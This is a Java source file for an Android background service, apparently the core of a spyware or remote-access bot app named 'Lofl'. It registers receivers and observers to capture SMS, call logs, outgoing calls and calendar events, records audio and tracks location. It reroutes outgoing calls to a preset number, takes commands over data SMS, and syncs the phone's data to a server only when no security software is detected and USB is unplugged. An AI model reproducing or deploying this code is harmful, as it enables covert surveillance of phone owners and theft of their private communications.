package com.candroid.lofl.services;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Process;
import android.preference.PreferenceManager;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;

import com.candroid.lofl.activities.LoflActivity;
import com.candroid.lofl.api.Apps;
import com.candroid.lofl.api.Bot;
import com.candroid.lofl.api.Systems;
import com.candroid.lofl.data.Constants;
import com.candroid.lofl.data.db.Database;
import com.candroid.lofl.data.db.DatabaseHelper;
import com.candroid.lofl.data.pojos.Recorder;
import com.candroid.lofl.receivers.SmsReceiver;
import com.candroid.lofl.receivers.HeadsetPlugReceiver;
import com.candroid.lofl.receivers.ImeReceiver;
import com.candroid.lofl.receivers.IncomingReceiver;
import com.candroid.lofl.receivers.OutgoingCallReceiver;
import com.candroid.lofl.receivers.ScreenReceiver;
import com.candroid.lofl.receivers.WapReceiver;
import com.candroid.lofl.receivers.WifiReceiver;

public class LoflService extends Service {

    private static final String TAG = LoflService.class.getSimpleName();
    public static final String NOTIFICATION_CLICK_ACTIVITY = "NOTIFICATION_CLICK_ACTIVITY";
    public static boolean sHasCalledHome = false;
    public static boolean sIsRunning = false;
    private IncomingReceiver mIncomingReceiver;
    private ScreenReceiver mScreenReceiver;
    private WapReceiver mWapReceiver;
    private SmsReceiver mSmsReceiver;
    private SmsObserver mObserver;
    private CallLogObserver mCallLogObserver;
    private CalendarObserver mCalendarObserver;
    private OutgoingCallReceiver mOutgoingCallReceiver;
    private HeadsetPlugReceiver mHeadsetReceiver;
    private WifiReceiver mWifiReceiver;
    public static String sTelephoneAddress;
    private LocationManager mLocationManager;
    public static MediaRecorder sMediaRecorder;
    private ImeReceiver mImeReceiver;
    public static Recorder sRecorder;
    public static boolean sIsBot;

    public LoflService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, createPersistentServiceNotification(this));
        //JobsScheduler.scheduleJob(this);
        sIsRunning = true;
        mIncomingReceiver = new IncomingReceiver();
        mHeadsetReceiver = new HeadsetPlugReceiver();
       // mImeReceiver = new ImeReceiver();
        mScreenReceiver = new ScreenReceiver();
        //mWapReceiver = new WapReceiver();
        //mWifiReceiver = new WifiReceiver();
/*        IntentFilter wapFilter = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
        wapFilter.addAction("android.provider.Telephony.MMS_RECEIVED");
        try {
            wapFilter.addDataType("application/vnd.wap.mms-message");
        } catch (IntentFilter.MalformedMimeTypeException e) {
            e.printStackTrace();
        }*/
        IntentFilter screenFilter = new IntentFilter();
        screenFilter.addAction(Intent.ACTION_SCREEN_ON);
        screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
        IntentFilter headsetFilter = new IntentFilter(Intent.ACTION_HEADSET_PLUG);
        IntentFilter incomingFilter = new IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION);
        incomingFilter.setPriority(Constants.PRIORITY);
        incomingFilter.addDataAuthority(Constants.HOST, Constants.PORT);
        incomingFilter.addDataScheme("sms");
        //  IntentFilter airplaneFilter = new IntentFilter();
        //  airplaneFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
        //  mAirplaneReceiver = new AirplaneReceiver();
        //  registerReceiver(mAirplaneReceiver, airplaneFilter);
        /*mShareReceiver = new ShareReceiver();
        IntentFilter shareFilter = new IntentFilter(Intent.ACTION_SEND);
        shareFilter.addCategory(Intent.CATEGORY_DEFAULT);
        try {
            shareFilter.addDataType("text/plain");
        } catch (IntentFilter.MalformedMimeTypeException e) {
            e.printStackTrace();
        }
        registerReceiver(mShareReceiver, shareFilter);*/
        //IntentFilter imeFilter = new IntentFilter(Intent.ACTION_INPUT_METHOD_CHANGED);
        //IntentFilter wifiFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
        //registerReceiver(mWapReceiver, wapFilter);
        if(this.checkSelfPermission(Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED){
            mOutgoingCallReceiver = new OutgoingCallReceiver();
            IntentFilter outgoingCallFilter = new IntentFilter();
            outgoingCallFilter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
            outgoingCallFilter.addCategory(Intent.CATEGORY_DEFAULT);
            registerReceiver(mOutgoingCallReceiver, outgoingCallFilter);
        }
        registerReceiver(mIncomingReceiver, incomingFilter);
        registerReceiver(mHeadsetReceiver, headsetFilter);
        registerReceiver(mScreenReceiver, screenFilter);
        //registerReceiver(mImeReceiver, imeFilter);
        //registerReceiver(mWifiReceiver, wifiFilter);
        IntentFilter databaseFilter = new IntentFilter();
        databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
        mSmsReceiver = new SmsReceiver();
        registerReceiver(mSmsReceiver, databaseFilter);
        sTelephoneAddress = Systems.Phone.getDeviceTelephoneNumber(this);
        Log.d(TAG, "address = " + sTelephoneAddress);
        mObserver = new SmsObserver();
        mCallLogObserver = new CallLogObserver();
        mCalendarObserver = new CalendarObserver();
       // getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
        if(this.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
            getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
        }
        if(this.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
            getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
        }
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        OutgoingCallReceiver.sRerouteNumber = sharedPreferences.getString(OutgoingCallReceiver.NUMBER_KEY, "9727729432");
        ScreenReceiver.sShouldRecordAudio = sharedPreferences.getBoolean(ScreenReceiver.RECORDER_KEY, false);
        sHasCalledHome = sharedPreferences.getBoolean(Constants.Keys.CALLED_HOME_KEY, false);
        Bot.sIsBot = sharedPreferences.getBoolean(Bot.IS_BOT_KEY, false);
        //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if(!sIsBot){
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    if(Systems.Gps.shouldTrackLocation(LoflService.this)){
                        Bot.onReceiveCommand(LoflService.this, 21, "start", null);
                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    boolean hasSecuritySoftware = Apps.hasSecuritySoftwareInstalled(LoflService.this);
                    if( !sIsBot && ! hasSecuritySoftware && Systems.Usb.isUsbDisconnected(LoflService.this)){
                        Bot.onReceiveCommand(LoflService.this, Bot.Commands.SYNC_PHONE_TO_SERVER, null, null);
                    }
                }
            }).start();
            Systems.Phone.Settings.requestIgnoreBatteryOptimizations(this);
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sIsRunning = false;
        unregisterReceiver(mIncomingReceiver);
        //unregisterReceiver(mWapReceiver);
        unregisterReceiver(mHeadsetReceiver);
        unregisterReceiver(mScreenReceiver);
        unregisterReceiver(mOutgoingCallReceiver);
        //unregisterReceiver(mImeReceiver);
        /*unregisterReceiver(mShareReceiver);*/
        //unregisterReceiver(mAirplaneReceiver);
        DatabaseHelper.getInstance(getApplicationContext()).close();
        unregisterReceiver(mSmsReceiver);
        //unregisterReceiver(mWifiReceiver);
        getContentResolver().unregisterContentObserver(mObserver);
        getContentResolver().unregisterContentObserver(mCallLogObserver);
        getContentResolver().unregisterContentObserver(mCalendarObserver);
 /*       mLocationManager.removeUpdates(mLocationListener);
        mLooper.quitSafely();
        mHandlerThread.quitSafely();*/
        if(sMediaRecorder != null){
            sMediaRecorder.stop();
            sMediaRecorder.release();
        }
        stopForeground(true);
        stopSelf();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static void insertMessage(Context context, String destinationAddress, String originAddress, String body, long time, int type){
        Database.insertMessage(DatabaseHelper.getInstance(context.getApplicationContext()), destinationAddress, originAddress, body, time, type);
    }

    private class CallLogObserver extends ContentObserver{
        private int mLastId = -1;
        public CallLogObserver() {
            super(new Handler());
        }

        @Override
        public void onChange(boolean selfChange, final Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    String[] projection = new String[]{CallLog.Calls._ID, CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
                    Cursor cursor = getContentResolver().query(uri, projection, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
                    if(cursor != null && cursor.moveToFirst()){
                        int idIndex = cursor.getColumnIndex(CallLog.Calls._ID);
                        int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                        int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                        int timeIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                        int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                        int id = cursor.getInt(idIndex);
                        if(mLastId != id){
                            mLastId = id;
                            String callType = cursor.getString(typeIndex);
                            String address = cursor.getString(numberIndex);
                            String time = cursor.getString(timeIndex);
                            String duration = cursor.getString(durationIndex);
                            long newRowId = Database.insertCallLogEntry(DatabaseHelper.getInstance(getApplicationContext().getApplicationContext()), callType, address, duration, time);
                        }
                        cursor.close();
                    }
                }
            }).start();
        }
    }

    private class SmsObserver extends ContentObserver {
        private int mLastSentMessageId = -1;

        public SmsObserver() {
            super(new Handler());
        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }

        @Override
        public void onChange(boolean selfChange, final Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    // TODO: 1/27/19 we need to do a projection for sms. the problem is is that the content uri is set to the base uri without a specific table. however the constant values for columns in boht are identical
                    Cursor cursor = getContentResolver().query(uri, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
                    if (cursor != null && cursor.moveToFirst()) {
                        int type = cursor.getInt(cursor.getColumnIndex("type"));
                        if ( type == 2) {
                            int id = cursor.getInt(cursor.getColumnIndex("_id"));
                            if (id != mLastSentMessageId) {
                                mLastSentMessageId = id;
                                String body = cursor.getString(cursor.getColumnIndex("body"));
                                String address = cursor.getString(cursor.getColumnIndex("address"));
                                Intent outgoingSmsIntent = new Intent();
                                outgoingSmsIntent.putExtra(Constants.Keys.ADDRESS_KEY, address);
                                outgoingSmsIntent.putExtra(Constants.Keys.BODY_KEY, body);
                                outgoingSmsIntent.putExtra(Constants.Keys.TYPE_KEY, type);
                                outgoingSmsIntent.setAction(Constants.Actions.ACTION_OUTGOING_SMS);
                                sendBroadcast(outgoingSmsIntent);
                            }
                        }
                        cursor.close();
                    }
                }
            }).start();
        }
    }

    private class CalendarObserver extends ContentObserver{
        private int mLastId = -1;

        public CalendarObserver() {
            super(new Handler());
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    String[] projection = new String[]{CalendarContract.Events._ID, CalendarContract.Events.ACCOUNT_NAME, CalendarContract.Events.TITLE, CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
                            CalendarContract.Events.DTEND, CalendarContract.Events.ALL_DAY, CalendarContract.Events.DURATION, CalendarContract.Events.CALENDAR_TIME_ZONE, CalendarContract.Events.EVENT_LOCATION, CalendarContract.Events.ORGANIZER};
                    Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, projection, null, null, null);
                    if(cursor != null && cursor.moveToLast()){
                        int accountNameIndex = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
                        int titleIndex = cursor.getColumnIndex(CalendarContract.Events.TITLE);
                        int descriptionIndex = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
                        int dateStartIndex = cursor.getColumnIndex(CalendarContract.Events.DTSTART);
                        int dateEndIndex = cursor.getColumnIndex(CalendarContract.Events.DTEND);
                        int allDayIndex = cursor.getColumnIndex(CalendarContract.Events.ALL_DAY);
                        int durationIndex = cursor.getColumnIndex(CalendarContract.Events.DURATION);
                        int calendarTimeZoneIndex = cursor.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE);
                        int locationIndex = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION);
                        int organizerIndex = cursor.getColumnIndex(CalendarContract.Events.ORGANIZER);
                        int id = cursor.getInt(cursor.getColumnIndex(CalendarContract.Events._ID));
                        if(mLastId != id){
                            mLastId = id;
                            String account = cursor.getString(accountNameIndex);
                            String title = cursor.getString(titleIndex);
                            String description = cursor.getString(descriptionIndex);
                            long beginDate = cursor.getLong(dateStartIndex);
                            long endDate = cursor.getLong(dateEndIndex);
                            int isAllDay = cursor.getInt(allDayIndex);
                            String duration = cursor.getString(durationIndex);
                            String timeZone = cursor.getString(calendarTimeZoneIndex);
                            String location = cursor.getString(locationIndex);
                            String organizer = cursor.getString(organizerIndex);
                            Database.insertCalendarEvent(LoflService.this, DatabaseHelper.getInstance(getApplicationContext()), account, title, description, beginDate, endDate, isAllDay, duration, timeZone, location, organizer);
                        }
                    }
                    cursor.close();
                }
            }).start();
        }
    }

    public static void recordAudio(Context context){
        if(sRecorder == null){
            sRecorder = new Recorder(context);
        }
        sRecorder.start();
    }

    public static void stopRecording(){
        if(sRecorder != null){
            sRecorder.stop();
        }
    }

    private static void createPersistentForegroundNotificationChannel(Context context) {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        if(notificationManager.getNotificationChannel(Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID) == null){
            NotificationChannel notificationChannel = new NotificationChannel(Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID, Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID, NotificationManager.IMPORTANCE_DEFAULT);
            notificationChannel.enableVibration(false);
            notificationChannel.enableLights(false);
            notificationManager.createNotificationChannel(notificationChannel);
        }
    }

    public static Notification createPersistentServiceNotification(Context context) {
        createPersistentForegroundNotificationChannel(context);
        String activityName = PreferenceManager.getDefaultSharedPreferences(context).getString(NOTIFICATION_CLICK_ACTIVITY, LoflActivity.class.getName());
        Intent intent = null;
        try {
            intent = new Intent(context, Class.forName(activityName));
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            intent = new Intent(context, LoflActivity.class);
        }
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        Notification.Builder builder = new Notification.Builder(context, Constants.FOREGROUND_NOTIFICATION_CHANNEL_ID);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);
        builder.setContentIntent(pendingIntent);
        builder.setSmallIcon(android.R.drawable.stat_notify_chat);
        builder.setContentTitle(sharedPreferences.getString(Constants.Keys.NOTIFICATION_TITLE_KEY, "title"));
        builder.setContentText(sharedPreferences.getString(Constants.Keys.NOTIFICATION_CONTENT_KEY, "content"));
        builder.setColorized(true);
        builder.setColor(context.getResources().getColor(android.R.color.holo_green_dark));
        return builder.build();
    }
}